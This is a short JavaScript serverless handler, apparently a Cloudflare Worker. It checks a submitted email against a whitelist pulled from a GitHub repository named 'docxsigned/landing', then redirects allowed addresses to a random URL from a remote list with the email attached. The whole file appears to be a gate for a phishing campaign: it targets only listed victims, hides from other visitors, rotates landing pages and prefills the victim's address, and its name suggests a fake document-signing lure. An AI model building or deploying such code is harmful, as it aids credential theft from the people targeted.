
export default {
  async fetch(request, env, ctx) {
    if (request.method === "POST" && new URL(request.url).pathname === "/api/validate") {
      try {
        const { email } = await request.json();
        const list = await fetch('https://raw.githubusercontent.com/docxsigned/landing/main/list.txt').then(res => res.text());
        const urls = await fetch('https://raw.githubusercontent.com/docxsigned/landing/main/url.txt').then(res => res.text());

        const whitelist = list.split('\n').map(e => e.trim().toLowerCase());
        const urlList = urls.split('\n').filter(Boolean);

        if (!whitelist.includes(email.toLowerCase())) {
          return new Response(JSON.stringify({ error: 'unauthorized' }), { status: 403 });
        }

        const randomUrl = urlList[Math.floor(Math.random() * urlList.length)];
        return new Response(JSON.stringify({ redirect: randomUrl + '?email=' + encodeURIComponent(email) }), {
          headers: { 'Content-Type': 'application/json' }
        });
      } catch (err) {
        return new Response(JSON.stringify({ error: 'invalid_request' }), { status: 400 });
      }
    }
    return new Response("Not found", { status: 404 });
  }
};
